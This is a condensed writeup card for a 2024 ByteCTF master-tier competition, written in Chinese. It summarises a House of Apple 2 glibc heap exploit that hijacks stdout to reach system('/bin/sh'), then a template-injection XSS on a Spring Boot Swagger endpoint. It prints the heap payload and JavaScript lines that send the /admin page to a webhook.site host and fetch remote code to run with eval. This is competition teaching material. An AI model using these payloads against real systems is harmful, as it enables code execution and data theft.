---
title: "2024 ByteCTF 大师赛 writeup by Mini-Venom"
category: pwn
tags: ["ByteCTF大师赛", "pwn", "libc-2.27", "House of Apple 2", "IO_FILE", "wfile_jump"]
signals: ["ByteCTF大师赛 2024", "libc-2.27", "House of Apple 2", "IO_FILE", "wfile_jump", "system", "/bin/sh", "Spring Boot Swagger", "profileRegex", "pwn_unknown", "web_unknown", "ssti", "xss", "House"]
difficulty: hard
source: "https://www.ctfiot.com/206654.html"
tools: ["Go", "Spring"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2024 ByteCTF 大师赛 writeup by Mini-Venom

> 赛事：ByteCTF大师赛 2024 | 方向：pwn | 难度：hard | 工具：Go、Spring

## 一句话总结

House of Apple 2 改 stdout 劫持 + Spring Boot Swagger profileRegex 模板注入 + SSIM AI 图像攻击。

## 攻击链

1. 堆布局 0x100+0x1000+0xc70+0xdb0+0x10 → off_by_null 改 size → 申请 0xdc0+0x10 → 0x1f1 fake prev_size 指向 stdout → 写 fake IO 走 _IO_wfile_jumps vtable → system("/bin/sh") → Spring Boot Swagger 找 /api/v1/users/updatePermission → profileRegex = ^.{0,80}$ 截断 profile 80 字符 → 模板注入 {{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/.../',{method:'POST',body:r}))}} → SSIM >0.9 判 AI 图像攻击

## 关键 payload

```
flat({0x0:' sh', 0xa0:p64(stdout-0x130+0xd8), 0x10:p64(libc.symbols['system']), 0x20:p64(stdout), 0x98:p64(stdout-0x20+0x80), 0xd8:p64(wfile_jump+0x48-0x38), 0x60:'/bin/sh\x00', 0x80:p64(libc.symbols['system']), 0x88:p64(stdout-0x30), 0xe0:p64(stdout-8)}) ; {{fetch('https://webhook.site/...').then(a=>a.text().then(a=>eval(a)))}}
```

## 经验教训

IO_FILE 链走 _IO_wfile_jumps 路径绕 vtable check 是 2.27+ 标配，profileRegex 长度截断要 double encode 注入。

## 标签

libc-2.27、House of Apple 2、IO_FILE、wfile_jump、system、/bin/sh、Spring Boot Swagger、profileRegex、Go template、fetch webhook XSS、SSIM AI 图像攻击

## 参考来源

- https://www.ctfiot.com/206654.html
- 原文件：2024_ByteCTF大师赛_writeup_by_Mini-Venom.full.md
